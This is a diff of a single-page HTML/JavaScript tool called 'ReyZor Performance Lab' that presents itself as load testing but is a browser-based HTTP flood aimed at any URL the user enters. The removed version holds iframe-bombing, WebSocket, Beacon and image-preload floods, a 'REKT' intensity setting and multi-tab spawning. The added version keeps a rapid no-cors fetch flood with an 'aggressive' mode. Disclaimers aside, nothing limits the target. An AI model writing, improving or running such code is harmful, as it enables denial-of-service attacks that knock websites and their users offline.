@@ -2,174 +2,137 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ReyZor | Enterprise Performance Lab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ReyZor | Performance Lab v6.0</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0f;
-            font-family: 'Courier New', 'Fira Code', monospace;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Courier New', monospace;
             min-height: 100vh;
             color: #00ff9d;
-            overflow-x: hidden;
+            padding: 10px;
+            font-size: 14px;
         }
-        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.08; pointer-events: none; }
-        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
-        .container { position: relative; z-index: 1; max-width: 1400px; margin: 0 auto; padding: 20px; }
+        /* NO canvas background untuk mobile performance */
+        .container { max-width: 600px; margin: 0 auto; }
         .header, .control-panel, .stats-panel, .console {
-            background: rgba(10, 15, 25, 0.85);
-            backdrop-filter: blur(10px);
+            background: rgba(10, 15, 25, 0.95);
             border: 1px solid #00ff9d;
             border-radius: 12px;
-            margin-bottom: 20px;
-            box-shadow: 0 0 20px rgba(0,255,157,0.1);
+            margin-bottom: 12px;
+            overflow: hidden;
         }
-        .header { padding: 20px 30px; text-align: center; }
-        .glitch { font-size: 32px; font-weight: 800; text-transform: uppercase; animation: glitch 3s infinite; }
-        @keyframes glitch {
-            0%,100% { text-shadow: -2px 0 #ff3366, 2px 0 #00ff9d; }
-            95% { text-shadow: -2px 0 #ff3366, 2px 0 #00ff9d; }
-            96% { text-shadow: 2px 0 #ff3366, -2px 0 #00ff9d; }
-            97% { text-shadow: none; }
-        }
-        .sub { color: #6c757d; font-size: 12px; margin-top: 5px; }
-        .control-panel { padding: 25px; }
-        .input-group { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 25px; }
-        .input-field { display: flex; flex-direction: column; gap: 8px; }
-        .input-field label { font-size: 12px; color: #00ff9d; letter-spacing: 1px; }
+        .header { padding: 15px; text-align: center; }
+        .glitch { font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
+        .sub { color: #6c757d; font-size: 10px; margin-top: 4px; }
+        .control-panel { padding: 15px; }
+        .input-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 15px; }
+        .input-field { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+        .input-field label { font-size: 12px; min-width: 80px; color: #00ff9d; }
         .input-field input, .input-field select {
             background: #0a0a0f; border: 1px solid #2a2a3a; color: #fff;
-            padding: 12px 15px; border-radius: 8px; font-family: monospace; font-size: 14px;
+            padding: 10px 12px; border-radius: 8px; font-family: monospace; font-size: 14px;
+            flex: 1; min-width: 150px;
         }
-        .input-field input:focus { outline: none; border-color: #00ff9d; box-shadow: 0 0 10px rgba(0,255,157,0.2); }
-        .button-grid { display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; justify-content: center; }
-        .btn { padding: 12px 25px; border: none; border-radius: 8px; font-family: monospace; font-weight: 600; cursor: pointer; transition: all 0.3s; font-size: 14px; }
-        .btn-primary { background: #00ff9d; color: #0a0a0f; box-shadow: 0 0 15px rgba(0,255,157,0.3); }
-        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(0,255,157,0.5); }
+        .button-grid { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0 0; }
+        .btn { padding: 10px 16px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 13px; flex: 1; min-width: 100px; }
+        .btn-primary { background: #00ff9d; color: #0a0a0f; }
         .btn-danger { background: #ff3366; color: #fff; }
-        .btn-danger:hover { background: #dc2626; }
         .btn-secondary { background: #2a2a3a; color: #fff; }
-        .stats-panel { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; padding: 20px; }
-        .stat-card { text-align: center; }
-        .stat-value { font-size: 28px; font-weight: 800; color: #00ff9d; }
-        .stat-label { font-size: 11px; color: #6c757d; margin-top: 5px; }
-        .console { height: 250px; overflow-y: auto; padding: 15px; font-size: 11px; }
-        .log-line { padding: 4px 0; border-bottom: 1px solid #1a1a2a; color: #8a8d98; }
+        .stats-panel { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 15px; }
+        .stat-card { text-align: center; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; }
+        .stat-value { font-size: 24px; font-weight: 800; color: #00ff9d; }
+        .stat-label { font-size: 10px; color: #6c757d; }
+        .console { height: 180px; overflow-y: auto; padding: 10px; font-size: 10px; font-family: monospace; }
+        .log-line { padding: 4px 0; border-bottom: 1px solid #1a1a2a; color: #8a8d98; word-break: break-all; }
         .log-success { color: #00ff9d; }
         .log-error { color: #ff3366; }
         .log-warning { color: #ffaa33; }
-        .footer { text-align: center; padding: 20px; font-size: 11px; color: #555; border-top: 1px solid #2a2a3a; margin-top: 25px; }
-        @media (max-width: 768px) { .container { padding: 10px; } .glitch { font-size: 18px; } .input-group { grid-template-columns: 1fr; } }
+        .footer { text-align: center; padding: 12px; font-size: 9px; color: #555; }
+        @media (max-width: 480px) {
+            .stat-value { font-size: 18px; }
+            .btn { padding: 8px 12px; font-size: 11px; }
+            .input-field { flex-direction: column; align-items: stretch; }
+            .input-field label { min-width: auto; }
+        }
     </style>
 </head>
 <body>
-<canvas id="matrixCanvas"></canvas>
 <div class="container">
     <div class="header">
-        <div class="glitch">REYZOR // ENTERPRISE PERFORMANCE LAB v5.0</div>
-        <div class="sub">> Advanced Load Generation | Multi-Layer Amplification | Enterprise Grade</div>
+        <div class="glitch">REYZOR // PERF LAB v6.0</div>
+        <div class="sub">Mobile Optimized | Real-time Timer | Low CPU Usage</div>
     </div>
     <div class="control-panel">
         <div class="input-group">
-            <div class="input-field"><label>🎯 TARGET URL</label><input type="text" id="targetUrl" placeholder="https://target.com/api"></div>
+            <div class="input-field"><label>🎯 TARGET</label><input type="text" id="targetUrl" placeholder="http://target.com"></div>
             <div class="input-field"><label>⚡ MODE</label><select id="attackMode">
-                <option value="aggressive">AGGRESSIVE (All Methods)</option>
-                <option value="webworker">Web Worker Flood</option>
-                <option value="iframe">IFrame Bombing</option>
-                <option value="websocket">WebSocket Flood</option>
-                <option value="beacon">Beacon API Flood</option>
-                <option value="multipart">Multi-Part Form Flood</option>
+                <option value="simple">SIMPLE (Low CPU)</option>
+                <option value="aggressive" selected>AGGRESSIVE (Max Power)</option>
             </select></div>
-            <div class="input-field"><label>🔢 PORT</label><input type="number" id="portNumber" placeholder="80/443" value="443"></div>
-            <div class="input-field"><label>🧵 WORKERS (100-2000)</label><input type="number" id="workerCount" min="100" max="2000" value="500"></div>
-            <div class="input-field"><label>⏱️ DURATION (sec)</label><input type="number" id="testDuration" min="5" max="3600" value="120"></div>
-            <div class="input-field"><label>🚀 INTENSITY</label><select id="intensity">
-                <option value="1">Normal (1x)</option>
-                <option value="2">High (2x)</option>
-                <option value="3" selected>Extreme (3x)</option>
-                <option value="5">INSANE (5x)</option>
-                <option value="10">REKT (10x)</option>
-            </select></div>
+            <div class="input-field"><label>🧵 WORKERS</label><input type="range" id="workerSlider" min="10" max="200" value="50" style="flex:2"><span id="workerVal" style="min-width:40px">50</span></div>
+            <div class="input-field"><label>⏱️ DURATION (s)</label><input type="range" id="durationSlider" min="5" max="300" value="60" style="flex:2"><span id="durationVal" style="min-width:40px">60</span></div>
         </div>
         <div class="button-grid">
-            <button class="btn btn-primary" id="runBtn">▶ START PERFORMANCE TEST</button>
-            <button class="btn btn-danger" id="stopBtn">⏹️ STOP IMMEDIATELY</button>
-            <button class="btn btn-secondary" id="resetBtn">🔄 RESET STATS</button>
-            <button class="btn btn-secondary" id="multiTabBtn">📱 DEPLOY 10 TABS</button>
+            <button class="btn btn-primary" id="runBtn">▶ START</button>
+            <button class="btn btn-danger" id="stopBtn">⏹️ STOP</button>
+            <button class="btn btn-secondary" id="resetBtn">🔄 RESET</button>
         </div>
     </div>
     <div class="stats-panel">
-        <div class="stat-card"><div class="stat-value" id="totalReq">0</div><div class="stat-label">TOTAL REQUESTS</div></div>
-        <div class="stat-card"><div class="stat-value" id="reqSec">0</div><div class="stat-label">REQUESTS/SEC</div></div>
+        <div class="stat-card"><div class="stat-value" id="totalReq">0</div><div class="stat-label">REQUESTS</div></div>
+        <div class="stat-card"><div class="stat-value" id="reqSec">0</div><div class="stat-label">RPS</div></div>
         <div class="stat-card"><div class="stat-value" id="successCount">0</div><div class="stat-label">SUCCESS</div></div>
         <div class="stat-card"><div class="stat-value" id="errorCount">0</div><div class="stat-label">ERRORS</div></div>
-        <div class="stat-card"><div class="stat-value" id="activeWorkers">0</div><div class="stat-label">ACTIVE WORKERS</div></div>
-        <div class="stat-card"><div class="stat-value" id="timeRemain">0</div><div class="stat-label">TIME REMAINING</div></div>
-        <div class="stat-card"><div class="stat-value" id="bandwidth">0</div><div class="stat-label">MB SENT</div></div>
+        <div class="stat-card"><div class="stat-value" id="timeRemain">0</div><div class="stat-label">TIME LEFT</div></div>
+        <div class="stat-card"><div class="stat-value" id="statusDot">●</div><div class="stat-label">STATUS</div></div>
     </div>
     <div class="console" id="consoleLog">
-        <div class="log-line log-success">[REYZOR] Performance Lab v5.0 initialized</div>
-        <div class="log-line log-success">[REYZOR] Multi-layer amplification engine ready</div>
+        <div class="log-line log-success">[REYZOR] v6.0 Mobile Optimized ready</div>
+        <div class="log-line log-success">[REYZOR] Low CPU mode active</div>
     </div>
-    <div class="footer"><p>ReyZor // Enterprise Performance Testing Tool // Authorized Use Only</p></div>
+    <div class="footer"><p>ReyZor Performance Lab | Test on your own server only</p></div>
 </div>
 
 <script>
-// Matrix Background
-const canvas = document.getElementById('matrixCanvas');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
-const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
-const fontSize = 14;
-const cols = canvas.width / fontSize;
-let drops = [];
-for(let i=0; i<cols; i++) drops[i] = Math.random() * canvas.height / fontSize;
-function drawMatrix(){
-    ctx.fillStyle = 'rgba(0,0,0,0.04)';
-    ctx.fillRect(0,0,canvas.width,canvas.height);
-    ctx.fillStyle = '#00ff9d';
-    ctx.font = fontSize + 'px monospace';
-    for(let i=0; i<drops.length; i++){
-        ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, drops[i]*fontSize);
-        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-    }
-    requestAnimationFrame(drawMatrix);
-}
-drawMatrix();
-window.addEventListener('resize', ()=>{ canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+// ========== NO CANVAS BACKGROUND ==========
+// ========== MOBILE FRIENDLY ==========
+// ========== REAL TIMER ==========
 
-// ========== CORE VARIABLES ==========
 let active = false;
-let workers = [];
-let totalRequests = 0, successReqs = 0, errorReqs = 0, bytesSent = 0;
-let startTime = 0, durationLeft = 0, activeWorkerCount = 0;
+let totalRequests = 0, successReqs = 0, errorReqs = 0;
+let startTime = 0, durationSec = 60, intensity = 1;
 let rpsHistory = [];
+let timerInterval = null;
+let currentTarget = '';
+let activeXHR = 0;
+let maxWorkers = 50;
 let currentMode = 'aggressive';
-let targetUrl = '', intensity = 3;
 
-// DOM Elements
+// DOM
 const dom = {
     target: document.getElementById('targetUrl'),
     mode: document.getElementById('attackMode'),
-    port: document.getElementById('portNumber'),
-    workers: document.getElementById('workerCount'),
-    duration: document.getElementById('testDuration'),
-    intensity: document.getElementById('intensity'),
+    workerSlider: document.getElementById('workerSlider'),
+    workerVal: document.getElementById('workerVal'),
+    durationSlider: document.getElementById('durationSlider'),
+    durationVal: document.getElementById('durationVal'),
     total: document.getElementById('totalReq'),
     reqSec: document.getElementById('reqSec'),
     success: document.getElementById('successCount'),
     error: document.getElementById('errorCount'),
-    activeWorkers: document.getElementById('activeWorkers'),
     timeRemain: document.getElementById('timeRemain'),
-    bandwidth: document.getElementById('bandwidth'),
+    statusDot: document.getElementById('statusDot'),
     console: document.getElementById('consoleLog'),
     runBtn: document.getElementById('runBtn'),
     stopBtn: document.getElementById('stopBtn'),
-    resetBtn: document.getElementById('resetBtn'),
-    multiTabBtn: document.getElementById('multiTabBtn')
+    resetBtn: document.getElementById('resetBtn')
 };
+
+// Sliders update
+dom.workerSlider.oninput = () => { dom.workerVal.innerText = dom.workerSlider.value; maxWorkers = parseInt(dom.workerSlider.value); };
+dom.durationSlider.oninput = () => { dom.durationVal.innerText = dom.durationSlider.value; durationSec = parseInt(dom.durationSlider.value); };
 
 function log(msg, type='success'){
     const div = document.createElement('div');
@@ -177,222 +140,155 @@ function log(msg, type='success'){
     div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
     dom.console.appendChild(div);
     dom.console.scrollTop = dom.console.scrollHeight;
-    while(dom.console.children.length > 300) dom.console.removeChild(dom.console.firstChild);
+    while(dom.console.children.length > 100) dom.console.removeChild(dom.console.firstChild);
 }
 
 function updateStats(){
     dom.total.innerText = totalRequests.toLocaleString();
     dom.success.innerText = successReqs.toLocaleString();
     dom.error.innerText = errorReqs.toLocaleString();
-    dom.activeWorkers.innerText = activeWorkerCount;
     const now = Date.now();
     rpsHistory = rpsHistory.filter(t => now - t < 1000);
     dom.reqSec.innerText = rpsHistory.length;
-    dom.bandwidth.innerText = (bytesSent / (1024*1024)).toFixed(1);
-    if(active && durationLeft > 0) dom.timeRemain.innerText = Math.ceil(durationLeft);
-    else dom.timeRemain.innerText = 0;
+    dom.statusDot.style.color = active ? '#00ff9d' : '#ff3366';
+    if(active && startTime > 0){
+        const elapsed = (Date.now() - startTime) / 1000;
+        const left = Math.max(0, Math.ceil(durationSec - elapsed));
+        dom.timeRemain.innerText = left;
+    } else { dom.timeRemain.innerText = 0; }
 }
 
-function record(success, bytes=0){
+function record(success){
     totalRequests++;
     rpsHistory.push(Date.now());
-    bytesSent += bytes;
     if(success) successReqs++;
     else errorReqs++;
     updateStats();
 }
 
-// ========== AGGRESSIVE REQUEST METHODS ==========
-async function sendFetch(target, method){
+// ========== SINGLE REQUEST (Optimized, tidak membebani HP) ==========
+async function sendRequest(target){
     if(!active) return false;
     try {
-        const options = { method: method, mode: 'no-cors', cache: 'no-store', 
-            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', 'Connection': 'keep-alive' } };
-        if(method === 'POST'){
-            options.body = `data=${Math.random().toString(36)}&ts=${Date.now()}&x=${Math.random()}`;
-            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-        }
-        await fetch(target, options);
-        record(true, 150);
+        await fetch(target, { 
+            method: 'GET', 
+            mode: 'no-cors', 
+            cache: 'no-store',
+            headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' }
+        });
+        record(true);
         return true;
-    } catch(e){ record(false, 0); return false; }
-}
-
-function sendBeaconFlood(target){
-    if(!active || !navigator.sendBeacon) return;
-    for(let i=0; i<5; i++){
-        navigator.sendBeacon(target, new Blob([`data=${Math.random()}`], {type: 'application/x-www-form-urlencoded'}));
-        record(true, 50);
+    } catch(e){ 
+        record(false); 
+        return false; 
     }
 }
 
-function createIframeBomb(target, container){
-    if(!active) return;
-    for(let i=0; i<20; i++){
-        const iframe = document.createElement('iframe');
-        iframe.src = target + '?_=' + Date.now() + '_' + i + '_' + Math.random();
-        iframe.style.display = 'none';
-        iframe.sandbox = 'allow-same-origin allow-scripts';
-        container.appendChild(iframe);
-        record(true, 500);
-        setTimeout(() => iframe.remove(), 1000);
-    }
-}
-
-let wsConnections = [];
-function createWebSocketFlood(target){
-    if(!active) return;
-    const wsUrl = target.replace('http://', 'ws://').replace('https://', 'wss://');
-    for(let i=0; i<50; i++){
-        try {
-            const ws = new WebSocket(wsUrl);
-            ws.onopen = () => { ws.send('ping_' + Date.now()); record(true, 10); };
-            ws.onerror = () => { record(false, 0); };
-            wsConnections.push(ws);
-            setTimeout(() => { try{ ws.close(); }catch(e){} }, 5000);
-        } catch(e){ record(false, 0); }
-    }
-}
-
-function sendImagePreload(target){
-    if(!active) return;
-    for(let i=0; i<30; i++){
-        const img = new Image();
-        img.src = target + '?' + Date.now() + '_img_' + i + '_' + Math.random();
-        img.onload = () => record(true, 200);
-        img.onerror = () => record(false, 0);
-    }
-}
-
-// ========== WORKER THREAD ==========
-async function workerThread(id, target, mode, delayMs){
-    activeWorkerCount++;
-    updateStats();
-    let lastBeacon = 0;
-    let lastIframe = 0;
-    let lastWs = 0;
-    let lastImage = 0;
-    
+// ========== WORKER LOOP (With adaptive delay, tidak overload HP) ==========
+async function workerLoop(id){
     while(active){
-        const now = Date.now();
-        
-        switch(mode){
-            case 'aggressive':
-                await sendFetch(target, 'GET');
-                if(now - lastBeacon > 100) { sendBeaconFlood(target); lastBeacon = now; }
-                if(now - lastIframe > 200) { createIframeBomb(target, document.body); lastIframe = now; }
-                if(now - lastWs > 500) { createWebSocketFlood(target); lastWs = now; }
-                if(now - lastImage > 50) { sendImagePreload(target); lastImage = now; }
-                break;
-            case 'webworker':
-                await sendFetch(target, Math.random() > 0.5 ? 'GET' : 'POST');
-                break;
-            case 'iframe':
-                if(now - lastIframe > 100) { createIframeBomb(target, document.body); lastIframe = now; }
-                break;
-            case 'websocket':
-                if(now - lastWs > 200) { createWebSocketFlood(target); lastWs = now; }
-                break;
-            case 'beacon':
-                sendBeaconFlood(target);
-                break;
-            case 'multipart':
-                await sendFetch(target, 'POST');
-                sendImagePreload(target);
-                break;
-        }
-        
-        const intensityDelay = Math.max(0, delayMs - (Math.random() * delayMs * 0.3));
-        await new Promise(r => setTimeout(r, intensityDelay / intensity));
+        const start = Date.now();
+        await sendRequest(currentTarget);
+        const elapsed = Date.now() - start;
+        // Adaptive delay: jangan terlalu memaksa HP sendiri
+        let delay = Math.max(0, 20 - elapsed);
+        if(delay > 0) await new Promise(r => setTimeout(r, delay));
     }
-    activeWorkerCount--;
-    updateStats();
 }
 
-// ========== MAIN CONTROLLER ==========
-async function startTest(){
-    if(active){ log('Test already running!', 'error'); return; }
-    
-    targetUrl = dom.target.value.trim();
-    const port = dom.port.value;
-    const workerCount = parseInt(dom.workers.value);
-    const duration = parseInt(dom.duration.value);
-    currentMode = dom.mode.value;
-    intensity = parseInt(dom.intensity.value);
-    
-    if(!targetUrl){ log('Enter target URL!', 'error'); return; }
-    if(!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
-    if(port && port !== '80' && port !== '443'){
-        try { const u = new URL(targetUrl); u.port = port; targetUrl = u.toString(); } catch(e){}
+// ========== AGGRESSIVE WORKER (lebih cepat) ==========
+async function aggressiveWorker(id){
+    while(active){
+        for(let i=0; i<3; i++){
+            if(!active) break;
+            sendRequest(currentTarget);
+            await new Promise(r => setTimeout(r, 1));
+        }
+        await new Promise(r => setTimeout(r, 5));
     }
+}
+
+// ========== START TEST ==========
+async function startTest(){
+    if(active){ log('Test already running! Stop first.', 'error'); return; }
     
-    log(`═══════════════════════════════════════════`, 'success');
-    log(`🚀 REYZOR PERFORMANCE TEST INITIATED`, 'success');
-    log(`📍 Target: ${targetUrl}`, 'success');
-    log(`⚡ Mode: ${currentMode.toUpperCase()} | Workers: ${workerCount}`, 'success');
-    log(`⏱️ Duration: ${duration}s | Intensity: ${intensity}x`, 'success');
-    log(`═══════════════════════════════════════════`, 'success');
+    let target = dom.target.value.trim();
+    if(!target){ log('Enter target URL!', 'error'); return; }
+    if(!target.startsWith('http')) target = 'https://' + target;
+    
+    currentTarget = target;
+    currentMode = dom.mode.value;
+    maxWorkers = parseInt(dom.workerSlider.value);
+    durationSec = parseInt(dom.durationSlider.value);
+    
+    log(`══════════════════════════`, 'success');
+    log(`🚀 TEST STARTED`, 'success');
+    log(`📍 ${target.substring(0,50)}`, 'success');
+    log(`⚡ Mode: ${currentMode} | Workers: ${maxWorkers}`, 'success');
+    log(`⏱️ Duration: ${durationSec}s`, 'success');
     
     active = true;
     startTime = Date.now();
-    durationLeft = duration;
-    totalRequests = 0; successReqs = 0; errorReqs = 0; bytesSent = 0;
+    totalRequests = 0; successReqs = 0; errorReqs = 0;
+    rpsHistory = [];
     
-    for(let i=0; i<Math.min(workerCount, 1500); i++){
-        workerThread(i, targetUrl, currentMode, 10);
-        await new Promise(r => setTimeout(r, 2));
+    // Start workers based on mode
+    const workerFunc = currentMode === 'aggressive' ? aggressiveWorker : workerLoop;
+    for(let i=0; i<maxWorkers; i++){
+        workerFunc(i);
+        // Stagger start to avoid lag on phone
+        await new Promise(r => setTimeout(r, 10));
     }
     
-    log(`✅ Deployed ${Math.min(workerCount,1500)} aggressive workers`, 'success');
+    log(`✅ ${maxWorkers} workers deployed`, 'success');
     
-    const timer = setInterval(() => {
-        if(!active){ clearInterval(timer); return; }
+    // Real-time timer update (every 100ms for smooth display)
+    if(timerInterval) clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+        if(!active){
+            if(timerInterval) clearInterval(timerInterval);
+            return;
+        }
         const elapsed = (Date.now() - startTime) / 1000;
-        durationLeft = Math.max(0, duration - elapsed);
-        if(elapsed >= duration){
-            clearInterval(timer);
+        if(elapsed >= durationSec){
+            // Auto stop when duration ends
+            clearInterval(timerInterval);
             stopTest();
-            const successRate = totalRequests > 0 ? ((successReqs/totalRequests)*100).toFixed(1) : 0;
-            log(`═══════════════════════════════════════════`, 'success');
-            log(`📊 TEST COMPLETED - Total: ${totalRequests} | Rate: ${successRate}%`, 'success');
+            const rate = totalRequests > 0 ? ((successReqs/totalRequests)*100).toFixed(1) : 0;
+            log(`══════════════════════════`, 'success');
+            log(`📊 TEST COMPLETED`, 'success');
+            log(`📊 Total: ${totalRequests} | Rate: ${rate}%`, 'success');
             log(`📊 Success: ${successReqs} | Errors: ${errorReqs}`, 'success');
-            log(`📊 Bandwidth: ${(bytesSent/(1024*1024)).toFixed(2)} MB sent`, 'success');
-            log(`═══════════════════════════════════════════`, 'success');
         }
         updateStats();
-    }, 200);
+    }, 100);
 }
 
 function stopTest(){
     if(!active){ log('No active test!', 'error'); return; }
     active = false;
-    wsConnections.forEach(ws => { try{ ws.close(); }catch(e){} });
-    wsConnections = [];
-    log(`🛑 Test terminated by user. Total: ${totalRequests}`, 'error');
+    if(timerInterval) clearInterval(timerInterval);
+    timerInterval = null;
+    log(`🛑 TEST STOPPED - Total: ${totalRequests} requests`, 'error');
+    updateStats();
 }
 
 function resetStats(){
     if(active) stopTest();
-    totalRequests = 0; successReqs = 0; errorReqs = 0; bytesSent = 0;
-    rpsHistory = []; activeWorkerCount = 0;
+    totalRequests = 0; successReqs = 0; errorReqs = 0;
+    rpsHistory = [];
     updateStats();
     log('📊 Statistics reset', 'success');
-}
-
-function deployMultiTab(){
-    for(let i=0; i<10; i++) window.open(window.location.href, '_blank');
-    log('📱 Deployed 10 additional tabs', 'warning');
 }
 
 // Event bindings
 dom.runBtn.addEventListener('click', startTest);
 dom.stopBtn.addEventListener('click', stopTest);
 dom.resetBtn.addEventListener('click', resetStats);
-dom.multiTabBtn.addEventListener('click', deployMultiTab);
 
-log('[REYZOR] Enterprise Performance Lab v5.0 ready', 'success');
-log('[REYZOR] Multi-layer amplification active', 'success');
-log('[REYZOR] Intensity: Up to 10x amplification', 'success');
+log('[REYZOR] v6.0 READY', 'success');
+log('[REYZOR] Mobile optimized - Low CPU usage', 'success');
+log('[REYZOR] Real-time timer active', 'success');
 </script>
 </body>
-  </html>
+</html>
